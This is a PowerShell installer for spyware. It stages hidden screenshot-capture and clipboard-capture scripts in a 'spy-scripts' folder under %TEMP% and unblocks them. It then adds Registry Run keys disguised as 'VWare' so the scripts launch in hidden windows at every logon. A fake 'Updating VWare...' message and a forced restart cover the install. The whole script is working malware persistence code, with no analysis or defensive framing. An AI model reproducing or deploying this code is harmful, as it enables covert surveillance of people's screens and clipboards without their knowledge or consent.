$registryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$ss = "$env:TEMP\spy-scripts\.screenshots.ps1"
$cb = "$env:TEMP\spy-scripts\.clipboard.ps1"
New-Item -Path "$env:TEMP\spy-scripts" -ItemType Directory -Force
New-Item -Path "$env:TEMP\Collection" -ItemType Directory -Force
Move-Item -Path ".\.screenshots.ps1" $ss
Move-Item -Path ".\.clipboard.ps1" $cb
Unblock-File "$env:TEMP\spy-scripts\*"

#New-ItemProperty -Path $registryPath -Name "VWare" -Value 'powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.screenshots.ps1"' -PropertyType String -Force
#New-ItemProperty -Path $registryPath -Name "VWare2" -Value 'powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.clipboard.ps1"' -PropertyType String -Force
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "VWare" /t REG_SZ /F /D "Powershell.exe -WindowStyle Hidden -File $ss"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "VWare2" /t REG_SZ /F /D "Powershell.exe -WindowStyle Hidden -File $cb"
Write-Host "Updating VWare..."
Start-Sleep 5
Restart-Computer
